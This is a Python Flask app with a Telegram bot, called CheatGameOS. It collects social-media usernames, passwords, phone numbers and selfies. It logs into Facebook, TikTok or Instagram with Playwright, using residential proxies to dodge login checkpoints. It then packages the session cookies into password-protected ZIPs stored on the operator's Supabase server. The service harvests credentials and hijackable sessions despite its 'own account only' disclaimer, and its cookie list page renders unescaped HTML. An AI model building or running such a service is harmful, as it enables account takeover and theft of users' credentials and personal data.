# -*- coding: utf-8 -*-
"""app.py — CheatGameOS: Web + Bot + Supabase + API Key List."""

import os
import io
import csv
import asyncio
import hashlib
import secrets
import logging
import threading
from datetime import datetime, timedelta, timezone
from functools import wraps

from flask import (
    Flask, request, render_template_string, jsonify,
    session, redirect, url_for, abort, Response
)
from supabase import create_client, Client

from extractor import (
    login_and_get_cookies, export_cookies_zip_bytes,
    SITES, get_render_ip_info, mask_proxy
)

# ==================== ĐỌC ENV TRỰC TIẾP ====================
TOKEN_TELEGRAM    = os.getenv("TOKEN_TELEGRAM", "").strip()
TEN_BOT_TELEGRAM  = os.getenv("TEN_BOT_TELEGRAM", "CheatGameOS Bot")
USERNAME_BOT      = os.getenv("USERNAME_BOT_TELEGRAM", "").strip().lstrip("@")
ALLOWED_USERNAMES = [
    u.strip().lstrip("@").lower()
    for u in os.getenv("ALLOWED_USERNAMES", "").split(",") if u.strip()
]

SECRET_KEY = os.getenv("SECRET_KEY", "change_me")
WEB_URL    = os.getenv("WEB_URL", "http://localhost:8080").rstrip("/")
PORT       = int(os.getenv("PORT", 8080))

SUPABASE_URL         = os.getenv("SUPABASE_URL", "")
SUPABASE_SERVICE_KEY = os.getenv("SUPABASE_SERVICE_KEY", "")
BUCKET_SELFIES       = os.getenv("SUPABASE_BUCKET_SELFIES", "selfies")
BUCKET_COOKIES       = os.getenv("SUPABASE_BUCKET_COOKIES", "cookies")

ZIP_PASSWORD = os.getenv("ZIP_PASSWORD", "cheatgame")   # ← mật khẩu ZIP
DOWNLOAD_TTL = int(os.getenv("DOWNLOAD_TOKEN_TTL", 300))
RATE_LIMIT   = int(os.getenv("RATE_LIMIT_PER_DAY", 5))
PLAYWRIGHT_HEADLESS = os.getenv("PLAYWRIGHT_HEADLESS", "true").lower() == "true"
DEFAULT_PROXY = os.getenv("DEFAULT_PROXY", "").strip()

# File keys
KEYS_FILE = os.getenv("KEYS_FILE", "keys.txt")

ENABLE = {
    "facebook":  os.getenv("ENABLE_FACEBOOK", "true").lower() == "true",
    "tiktok":    os.getenv("ENABLE_TIKTOK", "true").lower() == "true",
    "instagram": os.getenv("ENABLE_INSTAGRAM", "true").lower() == "true",
}

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
log = logging.getLogger(__name__)

# ==================== INIT ====================
app = Flask(__name__)
app.secret_key = SECRET_KEY
sb: Client = None
RENDER_INFO = {}


def init_supabase():
    global sb
    if not SUPABASE_URL or not SUPABASE_SERVICE_KEY:
        log.error("❌ Thiếu SUPABASE_URL hoặc SUPABASE_SERVICE_KEY")
        return None
    sb = create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY)
    return sb


def log_config():
    def mask(s, k=6):
        if not s: return "(empty)"
        return s[:k] + "..." + s[-k:] if len(s) > k * 2 else s[:k] + "..."
    log.info("═══════════ CHEATGAMEOS ═══════════")
    log.info(f"🤖 Bot        : {TEN_BOT_TELEGRAM} (@{USERNAME_BOT or '?'})")
    log.info(f"👥 Users      : {ALLOWED_USERNAMES or '(all)'}")
    log.info(f"🌐 Web URL    : {WEB_URL}")
    log.info(f"🗄️  Supabase   : {SUPABASE_URL}")
    log.info(f"🔒 ZIP pass   : {mask(ZIP_PASSWORD, 3)}")
    log.info(f"📁 Keys file  : {KEYS_FILE}")
    log.info("═══════════════════════════════════")


# ==================== API KEY MANAGEMENT ====================
def load_keys_from_file() -> list:
    """Đọc keys.txt → list."""
    if not os.path.isfile(KEYS_FILE):
        log.warning(f"⚠️ Không tìm thấy {KEYS_FILE}")
        return []
    with open(KEYS_FILE, "r", encoding="utf-8") as f:
        keys = [line.strip() for line in f if line.strip()]
    log.info(f"📁 Đọc {len(keys)} keys từ {KEYS_FILE}")
    return keys


def import_keys_to_supabase():
    """Import keys vào Supabase nếu chưa có."""
    if not sb:
        return 0
    keys = load_keys_from_file()
    if not keys:
        return 0

    # Lấy keys đã có
    try:
        res = sb.table("cg_api_keys").select("key_code").execute()
        existing = {r["key_code"] for r in (res.data or [])}
    except Exception as e:
        log.error(f"❌ Lỗi check keys: {e}")
        return 0

    new_keys = [k for k in keys if k not in existing]
    if not new_keys:
        log.info(f"✅ Tất cả {len(keys)} keys đã có trong DB")
        return 0

    # Insert theo batch 100
    total = 0
    for i in range(0, len(new_keys), 100):
        batch = [{"key_code": k, "status": "available"} for k in new_keys[i:i+100]]
        try:
            sb.table("cg_api_keys").insert(batch).execute()
            total += len(batch)
        except Exception as e:
            log.error(f"❌ Insert batch fail: {e}")

    log.info(f"✅ Import {total} keys mới vào Supabase")
    return total


def check_and_use_key(key_code: str, username: str, user_id: str) -> dict:
    """
    Kiểm tra key:
    - Không tồn tại → invalid
    - Đã dùng → used
    - Bị block → blocked
    - OK → đánh dấu used, trả về info
    """
    if not sb:
        return {"ok": False, "error": "Server chưa kết nối DB"}

    try:
        res = sb.table("cg_api_keys").select("*").eq(
            "key_code", key_code).limit(1).execute()
    except Exception as e:
        return {"ok": False, "error": f"Lỗi DB: {e}"}

    if not res.data:
        return {"ok": False, "error": "API Key không tồn tại"}

    key = res.data[0]
    status = key.get("status", "available")

    if status == "used":
        return {"ok": False,
                "error": f"Key đã dùng bởi @{key.get('used_by_telegram') or '?'} "
                         f"lúc {key.get('used_at', '?')[:19]}"}
    if status == "blocked":
        return {"ok": False, "error": "Key đã bị khóa"}

    # Mark as used
    try:
        sb.table("cg_api_keys").update({
            "status": "used",
            "used_by_telegram": username,
            "used_by_user_id": user_id,
            "used_at": datetime.now(timezone.utc).isoformat(),
        }).eq("key_code", key_code).execute()
    except Exception as e:
        return {"ok": False, "error": f"Không update được key: {e}"}

    return {"ok": True, "key": key_code}


# ==================== SUPABASE HELPERS ====================
def upsert_user(tg_id=None, username=None, full_name=None, phone=None):
    data = {
        "telegram_id": tg_id,
        "telegram_username": username,
        "full_name": full_name,
        "phone": phone,
    }
    data = {k: v for k, v in data.items() if v is not None}
    res = sb.table("cg_users").upsert(
        data, on_conflict="telegram_username" if username else "telegram_id"
    ).execute()
    return res.data[0] if res.data else {}


def upload_selfie(identifier, data, filename):
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    ext = os.path.splitext(filename)[1] or ".jpg"
    path = f"{identifier}/{ts}_{secrets.token_hex(4)}{ext}"
    sha = hashlib.sha256(data).hexdigest()
    sb.storage.from_(BUCKET_SELFIES).upload(
        path=path, file=data,
        file_options={"content-type": "image/jpeg", "upsert": "false"}
    )
    return path, sha


def upload_cookie_zip(identifier, data, filename):
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    path = f"{identifier}/{ts}_{filename}"
    sb.storage.from_(BUCKET_COOKIES).upload(
        path=path, file=data,
        file_options={"content-type": "application/zip", "upsert": "false"}
    )
    return path


def signed_url(bucket, path, expires=60):
    res = sb.storage.from_(bucket).create_signed_url(path, expires)
    return res.get("signedURL") or res.get("signed_url")


def create_verif(username, user_id, api_key, site, account, phone,
                 selfie_path, selfie_hash, ip, ua,
                 user_ip=None, proxy_used=None, mode="render"):
    res = sb.table("cg_verifications").insert({
        "telegram_username": username,
        "user_id": user_id,
        "api_key": api_key,
        "site": site,
        "account": mask_account(account),
        "phone": phone,
        "selfie_path": selfie_path,
        "selfie_hash": selfie_hash,
        "status": "pending",
        "ip_address": ip,
        "user_ip": user_ip,
        "proxy_used": proxy_used,
        "mode": mode,
        "user_agent": ua[:500] if ua else None,
    }).execute()
    return res.data[0]


def complete_verif(verif_id, cookie_path, count, exit_info=None):
    token = secrets.token_urlsafe(32)
    expires = datetime.now(timezone.utc) + timedelta(seconds=DOWNLOAD_TTL)
    update = {
        "status": "success",
        "cookie_path": cookie_path,
        "cookie_count": count,
        "download_token": token,
        "token_expires_at": expires.isoformat(),
        "completed_at": datetime.now(timezone.utc).isoformat(),
    }
    if exit_info:
        update.update({
            "exit_ip": exit_info.get("ip"),
            "exit_ip_country": exit_info.get("country"),
            "exit_ip_isp": exit_info.get("isp"),
            "exit_ip_is_dc": exit_info.get("is_datacenter", False),
        })
    sb.table("cg_verifications").update(update).eq("id", verif_id).execute()
    return token, expires.isoformat()


def fail_verif(verif_id, error):
    sb.table("cg_verifications").update({
        "status": "failed",
        "error_msg": error[:1000],
        "completed_at": datetime.now(timezone.utc).isoformat(),
    }).eq("id", verif_id).execute()


def get_verif_by_token(token):
    res = sb.table("cg_verifications").select("*").eq(
        "download_token", token).limit(1).execute()
    return res.data[0] if res.data else None


def list_user_cookies(username, limit=20):
    res = sb.table("cg_verifications").select(
        "id,site,account,status,cookie_count,created_at,"
        "completed_at,mode,exit_ip,exit_ip_country,exit_ip_isp,api_key"
    ).eq("telegram_username", username).eq(
        "status", "success"
    ).order("created_at", desc=True).limit(limit).execute()
    return res.data or []


def audit(username, action, detail=None, ip=None):
    try:
        sb.table("cg_audit_log").insert({
            "telegram_username": username,
            "action": action,
            "detail": detail or {},
            "ip": ip,
        }).execute()
    except Exception:
        pass


def mask_account(a):
    if "@" in a:
        n, d = a.split("@", 1)
        return (n[:2] + "*" * max(0, len(n) - 4) + n[-2:] + "@" + d
                if len(n) > 4 else "*" * len(n) + "@" + d)
    if len(a) <= 4:
        return a[0] + "*" * (len(a) - 1)
    return a[:2] + "*" * (len(a) - 4) + a[-2:]


# ==================== HELPERS ====================
def get_client_ip():
    fwd = request.headers.get("X-Forwarded-For", "")
    return fwd.split(",")[0].strip() if fwd else (request.remote_addr or "?")


def is_username_allowed(username):
    if not ALLOWED_USERNAMES:
        return True
    if not username:
        return False
    return username.lower().lstrip("@") in ALLOWED_USERNAMES


def require_api_key(f):
    @wraps(f)
    def w(*a, **k):
        if not session.get("key_authed"):
            return redirect(url_for("index"))
        return f(*a, **k)
    return w


# ==================== HTML ====================
BASE_CSS = """
*{box-sizing:border-box;margin:0;padding:0}
body{background:linear-gradient(135deg,#0d1117 0%,#1a1f2e 100%);
color:#c9d1d9;font-family:system-ui,-apple-system,sans-serif;
min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:#161b22;border:1px solid #30363d;border-radius:16px;
padding:40px;max-width:600px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.5)}
h1{color:#58a6ff;font-size:24px;margin-bottom:8px;text-align:center}
h1.ok{color:#3fb950}
h1.err{color:#f85149}
p.sub{color:#8b949e;font-size:13px;text-align:center;margin-bottom:24px}
label{display:block;font-size:13px;color:#8b949e;margin:14px 0 6px}
input,select{width:100%;padding:12px;background:#0d1117;border:1px solid #30363d;
border-radius:8px;color:#c9d1d9;font-size:14px;font-family:inherit}
input:focus,select:focus{outline:none;border-color:#58a6ff;
box-shadow:0 0 0 3px rgba(88,166,255,.15)}
button{width:100%;padding:14px;background:#238636;color:#fff;border:0;
border-radius:8px;cursor:pointer;font-weight:600;font-size:15px;margin-top:20px}
button:hover{background:#2ea043}
button:disabled{background:#30363d;cursor:not-allowed}
.note{background:#1f2937;border-left:3px solid #f59e0b;padding:12px;
font-size:12px;color:#fbbf24;border-radius:6px;margin-bottom:16px}
.warn{background:#2d1618;border-left:3px solid #f85149;padding:12px;
font-size:12px;color:#f85149;border-radius:6px;margin-bottom:16px}
.ok-box{background:#0f2a1a;border-left:3px solid #3fb950;padding:12px;
font-size:12px;color:#3fb950;border-radius:6px;margin-bottom:16px}
.ip{background:#0d1117;padding:12px;border-radius:8px;font-family:monospace;
font-size:12px;margin-bottom:16px;border:1px solid #30363d;line-height:1.8}
.err-box{color:#f85149;font-size:13px;margin-bottom:12px;
background:rgba(248,81,73,.1);padding:10px;border-radius:6px}
.info{background:#0d1117;padding:16px;border-radius:8px;margin:16px 0;
font-size:13px;line-height:1.8;white-space:pre-wrap;font-family:monospace}
.btn{display:inline-block;padding:12px 24px;background:#238636;color:#fff;
text-decoration:none;border-radius:8px;font-weight:600;margin-top:16px;text-align:center}
code{background:#21262d;padding:2px 6px;border-radius:4px;font-family:monospace;
font-size:12px;color:#f59e0b}
.pw{color:#f59e0b;font-weight:700}
.key-input{font-family:monospace;font-size:16px;text-align:center;
letter-spacing:1px}
"""

LOGIN_HTML = """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ bot_name }}</title><style>""" + BASE_CSS + """
.box{max-width:440px}</style></head><body><div class="box">
<h1>🔐 {{ bot_name }}</h1>
<p class="sub">Nhập API Key để tiếp tục</p>
{% if error %}<div class="err-box">{{ error }}</div>{% endif %}
<form method="POST">
<label>API Key</label>
<input type="text" name="api_key" placeholder="CHEATGAME-XXXX-XXXX-XXXX"
class="key-input" required autofocus autocomplete="off" spellcheck="false">
<button type="submit">Xác nhận</button>
</form>
<div class="note" style="margin-top:20px">
💡 Mỗi Key dùng được 1 lần. Nếu bạn chưa có → liên hệ admin.
</div>
</div></body></html>"""

FORM_HTML = """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Lấy Cookie</title><style>""" + BASE_CSS + """</style></head><body>
<div class="box">
<h1>🍪 Lấy Cookie Tài Khoản</h1>
<p class="sub">Chỉ dùng cho tài khoản CỦA CHÍNH BẠN</p>

<div class="ip">
🌐 <b>IP Render:</b> {{ render_ip }}<br>
🏢 ISP: {{ render_isp }}<br>
📍 {{ render_city }}, {{ render_country }}<br>
⚠️ Datacenter: {{ 'CÓ (dễ checkpoint)' if render_dc else 'Không' }}
</div>

{% if render_dc %}
<div class="warn">⚠️ IP Render là datacenter. Nếu login Facebook/TikTok
dễ bị checkpoint. Khuyến nghị nhập Proxy dân cư nếu có.</div>
{% else %}
<div class="ok-box">✅ IP dân cư — an toàn để login.</div>
{% endif %}

{% if error %}<div class="err-box">{{ error }}</div>{% endif %}

<div class="ip">👤 Người dùng: <b>@{{ tg_username }}</b><br>
🔑 API Key: <code>{{ api_key }}</code></div>

<form method="POST" enctype="multipart/form-data">
<label>Nền tảng</label>
<select name="site" required>
{% for s in sites %}<option value="{{ s }}">{{ s|capitalize }}</option>{% endfor %}
</select>

<label>Tài khoản (email / SĐT / username)</label>
<input type="text" name="username" required autocomplete="off">

<label>Mật khẩu</label>
<input type="password" name="password" required autocomplete="new-password">

<label>Số điện thoại liên hệ</label>
<input type="tel" name="phone" required pattern="[0-9+\\s-]{9,15}">

<label>Proxy (tùy chọn)</label>
<input type="text" name="proxy" placeholder="http://user:pass@host:port">
<small style="color:#8b949e;font-size:11px">Để trống = dùng IP Render</small>

<label>Ảnh selfie xác minh</label>
<input type="file" name="selfie" accept="image/*" required capture="user">

<button type="submit">🚀 Bắt đầu</button>
</form></div></body></html>"""

RESULT_HTML = """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Kết quả</title><style>""" + BASE_CSS + """</style></head><body>
<div class="box">
<h1 class="{{ 'ok' if success else 'err' }}">
{{ '✅ Thành công!' if success else '❌ Thất bại' }}</h1>
<div class="info">{{ message }}</div>
{% if success %}
<p style="text-align:center;margin:16px 0">
🔑 Mật khẩu ZIP: <span class="pw">cheatgame</span></p>
<p style="text-align:center;color:#8b949e;font-size:12px">
⏱️ Link có hiệu lực 5 phút, mở 1 lần</p>
<div style="text-align:center"><a class="btn" href="{{ download_url }}">
⬇️ Tải cookie ZIP</a></div>
{% endif %}
</div></body></html>"""


# ==================== ROUTES ====================
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        api_key = request.form.get("api_key", "").strip().upper()
        username = request.args.get("u") or session.get("tg_username") or ""
        username = username.strip().lstrip("@").lower()

        # Check key có trong DB không (chỉ check, chưa mark used)
        try:
            res = sb.table("cg_api_keys").select("status,used_by_telegram,used_at").eq(
                "key_code", api_key).limit(1).execute()
        except Exception as e:
            return render_template_string(
                LOGIN_HTML, error=f"Lỗi DB: {e}", bot_name=TEN_BOT_TELEGRAM)

        if not res.data:
            return render_template_string(
                LOGIN_HTML, error="API Key không tồn tại.",
                bot_name=TEN_BOT_TELEGRAM)

        key_info = res.data[0]
        if key_info["status"] == "used":
            return render_template_string(
                LOGIN_HTML,
                error=f"Key này đã dùng bởi @{key_info.get('used_by_telegram') or '?'}.",
                bot_name=TEN_BOT_TELEGRAM)
        if key_info["status"] == "blocked":
            return render_template_string(
                LOGIN_HTML, error="Key đã bị khóa.",
                bot_name=TEN_BOT_TELEGRAM)

        # OK — lưu session, mark used khi submit form thành công
        session["key_authed"] = True
        session["api_key"] = api_key
        if username:
            session["tg_username"] = username
        return redirect(url_for("cookie_form"))

    if session.get("key_authed"):
        return redirect(url_for("cookie_form"))
    u = request.args.get("u")
    if u:
        session["tg_username"] = u.strip().lstrip("@").lower()
    return render_template_string(
        LOGIN_HTML, error=None, bot_name=TEN_BOT_TELEGRAM)


def _form_error(msg):
    return render_template_string(
        FORM_HTML, error=msg,
        tg_username=session.get("tg_username", "unknown"),
        api_key=session.get("api_key", ""),
        render_ip=RENDER_INFO.get("ip", "?"),
        render_isp=RENDER_INFO.get("isp", "?"),
        render_city=RENDER_INFO.get("city", "?"),
        render_country=RENDER_INFO.get("country", "?"),
        render_dc=RENDER_INFO.get("is_datacenter", True),
        sites=[k for k, v in ENABLE.items() if v],
    )


@app.route("/cookie", methods=["GET", "POST"])
@require_api_key
def cookie_form():
    tg_username = session.get("tg_username", "")
    api_key = session.get("api_key", "")

    if tg_username and not is_username_allowed(tg_username):
        return _form_error(f"@{tg_username} không có quyền dùng tool này.")

    if request.method == "GET":
        return _form_error(None)

    site = request.form.get("site", "").strip()
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")
    phone = request.form.get("phone", "").strip()
    proxy = request.form.get("proxy", "").strip()
    selfie = request.files.get("selfie")

    if site not in SITES or not ENABLE.get(site):
        return _form_error("Nền tảng không hợp lệ hoặc bị tắt.")
    if not username or not password or not phone:
        return _form_error("Thiếu thông tin.")
    if not selfie or not selfie.filename:
        return _form_error("Thiếu ảnh selfie.")

    # Mark key as USED ngay khi submit thành công form
    key_result = check_and_use_key(api_key, tg_username or "web-user", None)
    if not key_result["ok"]:
        # Có thể đã bị race condition
        session.pop("key_authed", None)
        session.pop("api_key", None)
        return render_template_string(
            RESULT_HTML, success=False,
            message=f"❌ {key_result['error']}\nVui lòng thử key khác.",
            download_url="")

    # Upload selfie + tạo record
    user = upsert_user(username=tg_username or None, phone=phone)
    selfie_bytes = selfie.read()
    selfie_path, selfie_hash = upload_selfie(
        tg_username or "anon", selfie_bytes, selfie.filename)

    verif = create_verif(
        username=tg_username or "web-user",
        user_id=user.get("id"),
        api_key=api_key,
        site=site, account=username, phone=phone,
        selfie_path=selfie_path, selfie_hash=selfie_hash,
        ip=get_client_ip(), ua=request.headers.get("User-Agent", ""),
        user_ip=get_client_ip(),
        proxy_used=mask_proxy(proxy) if proxy else None,
        mode="proxy" if proxy else "render",
    )

    audit(tg_username or "web-user", "cookie_request", {
        "site": site, "verif_id": verif["id"],
        "api_key": api_key, "mode": "proxy" if proxy else "render",
    }, ip=get_client_ip())

    # Run Playwright
    proxy_use = proxy or DEFAULT_PROXY or None
    try:
        result = asyncio.run(login_and_get_cookies(
            site, username, password,
            proxy_str=proxy_use,
            headless=PLAYWRIGHT_HEADLESS,
        ))
    except Exception as e:
        fail_verif(verif["id"], f"Playwright: {e}")
        return render_template_string(
            RESULT_HTML, success=False,
            message=f"Lỗi hệ thống: {e}", download_url="")

    if not result["success"]:
        fail_verif(verif["id"], result["error"])
        info = result.get("exit_info", {})
        tip = ""
        if info.get("is_datacenter"):
            tip = ("\n💡 IP Render là datacenter → dễ checkpoint.\n"
                   "Thử lại sau 5-10 phút, hoặc nhập Proxy dân cư.")
        return render_template_string(
            RESULT_HTML, success=False,
            message=(f"Lý do: {result['error']}\n"
                     f"IP thoát: {info.get('ip', '?')}\n"
                     f"ISP: {info.get('isp', '?')}{tip}"),
            download_url="")

    # Success: ZIP with password "cheatgame"
    zip_bytes, zip_fname = export_cookies_zip_bytes(
        result["cookies"], site, username, ZIP_PASSWORD)
    cookie_path = upload_cookie_zip(
        tg_username or "anon", zip_bytes, zip_fname)

    token, expires = complete_verif(
        verif["id"], cookie_path, len(result["cookies"]),
        exit_info=result.get("exit_info"))

    audit(tg_username or "web-user", "cookie_success", {
        "verif_id": verif["id"], "site": site,
        "count": len(result["cookies"]),
        "exit_ip": result["exit_info"].get("ip"),
        "api_key": api_key,
    })

    download_url = url_for("download_by_token", token=token, _external=True)

    return render_template_string(
        RESULT_HTML, success=True,
        message=(f"Nền tảng:     {site}\n"
                 f"Tài khoản:    {mask_account(username)}\n"
                 f"Người dùng:   @{tg_username or 'web-user'}\n"
                 f"API Key:      {api_key}\n"
                 f"IP thoát:     {result['exit_info'].get('ip')}\n"
                 f"ISP:          {result['exit_info'].get('isp')}\n"
                 f"Số cookie:    {len(result['cookies'])}\n"
                 f"Hết hạn:      {expires}\n\n"
                 f"🔑 Mật khẩu ZIP: cheatgame"),
        download_url=download_url)


@app.route("/d/<token>")
def download_by_token(token):
    verif = get_verif_by_token(token)
    if not verif:
        abort(404)
    exp = verif.get("token_expires_at")
    if exp:
        exp_dt = datetime.fromisoformat(exp.replace("Z", "+00:00"))
        if datetime.now(timezone.utc) > exp_dt:
            abort(410, "Link hết hạn.")
    path = verif.get("cookie_path")
    if not path:
        abort(404)
    audit(verif.get("telegram_username"), "cookie_download",
          {"verif_id": verif["id"]}, ip=get_client_ip())
    url = signed_url(BUCKET_COOKIES, path, expires=60)
    return redirect(url)


@app.route("/my-cookies")
@require_api_key
def my_cookies():
    username = session.get("tg_username", "")
    rows = list_user_cookies(username)
    html = ["<html><head><meta charset='utf-8'>",
            "<meta name='viewport' content='width=device-width,initial-scale=1'>",
            "<title>Cookie của tôi</title>",
            f"<style>{BASE_CSS} .box{{max-width:1000px}}",
            "table{width:100%;border-collapse:collapse;background:#0d1117;",
            "border-radius:8px;overflow:hidden;margin-top:16px}",
            "th,td{padding:10px;text-align:left;border-bottom:1px solid #30363d;",
            "font-size:12px}",
            "th{background:#21262d;color:#58a6ff}",
            "tr:hover{background:#1c2128}</style></head><body>",
            "<div class='box'>",
            f"<h1>🍪 Cookie của @{username}</h1>",
            "<table><tr><th>Site</th><th>Tài khoản</th><th>Cookie</th>",
            "<th>API Key</th><th>IP</th><th>Ngày</th></tr>"]
    for r in rows:
        html.append(
            f"<tr><td>{r['site']}</td><td>{r['account']}</td>"
            f"<td>{r['cookie_count']}</td>"
            f"<td><code>{r.get('api_key','-')}</code></td>"
            f"<td><code>{r.get('exit_ip','-')}</code></td>"
            f"<td>{r['created_at'][:19]}</td></tr>")
    html.append("</table></div></body></html>")
    return "".join(html)


@app.route("/health")
def health():
    try:
        sb.table("cg_users").select("id").limit(1).execute()
        db = "ok"
    except Exception as e:
        db = f"error: {e}"
    return jsonify({
        "ok": True, "db": db,
        "bot": USERNAME_BOT,
        "render_ip": RENDER_INFO.get("ip"),
        "datacenter": RENDER_INFO.get("is_datacenter"),
    })


# ==================== TELEGRAM BOT ====================
async def cmd_start(update, ctx):
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup
    u = update.effective_user
    uname = (u.username or "").lower()
    if not is_username_allowed(uname):
        await update.message.reply_text(
            f"⛔ @{uname or 'unknown'} không có quyền dùng bot này.")
        return
    web_url = f"{WEB_URL}/?u={uname}"
    kb = [[InlineKeyboardButton("🌐 Mở form web", url=web_url)]]
    await update.message.reply_text(
        f"🍪 *{TEN_BOT_TELEGRAM}*\n\n"
        f"👤 Xin chào *{u.first_name}*! (@{uname})\n\n"
        f"📋 Các lệnh:\n"
        f"• /cookie — Mở form lấy cookie\n"
        f"• /mycookies — Xem cookie đã lấy\n"
        f"• /whoami — Xem username\n"
        f"• /help — Trợ giúp\n\n"
        f"⚠️ Chỉ dùng cho tài khoản CỦA CHÍNH BẠN.",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(kb),
    )


async def cmd_cookie(update, ctx):
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup
    u = update.effective_user
    uname = (u.username or "").lower()
    if not is_username_allowed(uname):
        await update.message.reply_text(f"⛔ @{uname} không có quyền.")
        return
    url = f"{WEB_URL}/?u={uname}"
    kb = [[InlineKeyboardButton("🌐 Mở form", url=url)]]
    await update.message.reply_text(
        f"🔐 *Cách sử dụng:*\n\n"
        f"1️⃣ Bấm nút mở web\n"
        f"2️⃣ Nhập API Key (CHEATGAME-XXXX-XXXX-XXXX)\n"
        f"3️⃣ Điền form + selfie\n"
        f"4️⃣ Nhận link tải ZIP\n\n"
        f"🔑 Mật khẩu ZIP: `cheatgame`",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(kb),
    )


async def cmd_mycookies(update, ctx):
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup
    u = update.effective_user
    uname = (u.username or "").lower()
    if not is_username_allowed(uname):
        await update.message.reply_text(f"⛔ @{uname} không có quyền.")
        return
    url = f"{WEB_URL}/my-cookies?u={uname}"
    kb = [[InlineKeyboardButton("📋 Xem cookie", url=url)]]
    await update.message.reply_text(
        f"📋 Cookie của @{uname}:",
        reply_markup=InlineKeyboardMarkup(kb),
    )


async def cmd_whoami(update, ctx):
    u = update.effective_user
    uname = u.username or "(chưa đặt username)"
    allowed = is_username_allowed(u.username or "")
    await update.message.reply_text(
        f"👤 Tên: *{u.first_name}*\n"
        f"📛 Username: @{uname}\n"
        f"✅ Quyền: {'Có' if allowed else 'Không'}",
        parse_mode="Markdown",
    )


async def cmd_help(update, ctx):
    await update.message.reply_text(
        "📖 *Hướng dẫn*\n\n"
        "1️⃣ /cookie → mở form web\n"
        "2️⃣ Nhập API Key (CHEATGAME-XXXX-XXXX-XXXX)\n"
        "3️⃣ Điền: nền tảng + tài khoản + mật khẩu + SĐT + selfie\n"
        "4️⃣ Chờ hệ thống login → nhận link tải ZIP\n"
        "5️⃣ Mật khẩu ZIP: `cheatgame`\n\n"
        "⚠️ Mỗi API Key dùng 1 lần.\n"
        "⚠️ Chỉ dùng cho tài khoản CỦA CHÍNH BẠN.",
        parse_mode="Markdown",
    )


def run_bot():
    if not TOKEN_TELEGRAM:
        log.error("❌ Không có TOKEN_TELEGRAM — bot không chạy")
        return
    from telegram import Update
    from telegram.ext import Application, CommandHandler

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    bot_app = Application.builder().token(TOKEN_TELEGRAM).build()
    bot_app.add_handler(CommandHandler("start", cmd_start))
    bot_app.add_handler(CommandHandler("cookie", cmd_cookie))
    bot_app.add_handler(CommandHandler("mycookies", cmd_mycookies))
    bot_app.add_handler(CommandHandler("whoami", cmd_whoami))
    bot_app.add_handler(CommandHandler("help", cmd_help))

    log.info("🤖 Bot Telegram bắt đầu polling...")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES)


# ==================== MAIN ====================
def bootstrap():
    log_config()
    init_supabase()
    # Import keys từ keys.txt vào Supabase
    if sb:
        try:
            import_keys_to_supabase()
        except Exception as e:
            log.error(f"❌ Import keys fail: {e}")

    global RENDER_INFO
    RENDER_INFO = get_render_ip_info()
    log.info(f"🌐 Render IP: {RENDER_INFO['ip']} "
             f"({RENDER_INFO.get('isp')}) "
             f"DC={RENDER_INFO.get('is_datacenter')}")

    if TOKEN_TELEGRAM and os.getenv("RUN_BOT_WITH_WEB", "true").lower() == "true":
        t = threading.Thread(target=run_bot, daemon=True)
        t.start()
        log.info("✅ Bot thread đã chạy")


bootstrap()


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
